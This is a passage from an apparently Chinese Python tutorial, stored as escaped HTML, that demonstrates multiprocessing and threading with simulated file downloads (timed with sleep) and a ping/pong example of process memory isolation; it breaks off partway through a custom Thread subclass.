&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200825010008066.png&quot; alt=&quot;image-20200825010008066&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;下面这个例子是采用多进程同时下载文件，可以节省下载时间：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time,sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;multiprocessing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Process &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#Process是一个类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;os &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;getpid&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;download_task&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;启动下载进程，进程号[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;].&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getpid&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;开始下载&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%filename)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    time_to_download=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(time_to_download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成！耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(filename,time_to_download))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=download_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Python学习手册.pdf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化，target表示进程启动后要执行的代码，元组里面是传递的参数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#start是Process类中的一个方法&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p2=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=download_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTML学习教程.mp4&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#等待进程执行结束，是Process类中定义好的&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;要实现两个进程间的通信。我们启动两个进程，一个输出ping，另一个输出pong，两个进程输出的ping和pong加起来总共10个&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;multiprocessing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time,sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;counter=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sub_task&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;counter&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;counter&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(string,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        counter+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0.1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=sub_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ping&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=sub_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;执行后的结果是ping和pong各自都输出了10个。原因是两个子进程复制了父进程及其所有的数据结果，每个子进程都有自己的独立的内存空间，也就是说每个子进程下都有一个counter变量。解决方案就是使用multiprocessing模块中的queue类，可以被多个进程共享队列。&lt;&#x2F;p&gt;
&lt;p&gt;多线程&lt;&#x2F;p&gt;
&lt;p&gt;基于threading模块来实现多线程编程。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time,sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;download_task&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;开始下载&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%filename)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    time_to_download=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(time_to_download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成！耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(filename,time_to_download))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=download_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Python学习手册.pdf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=download_task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTML学习视频.MP4&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在这个例子中，我们是使用threading模块中的Thread类来创建多线程的。&lt;&#x2F;p&gt;
&lt;p&gt;通过自定义类来实现多线程下载&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time,sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过super可以调用父类的构造函数。就可以调用父类中的属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__filename=filename&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
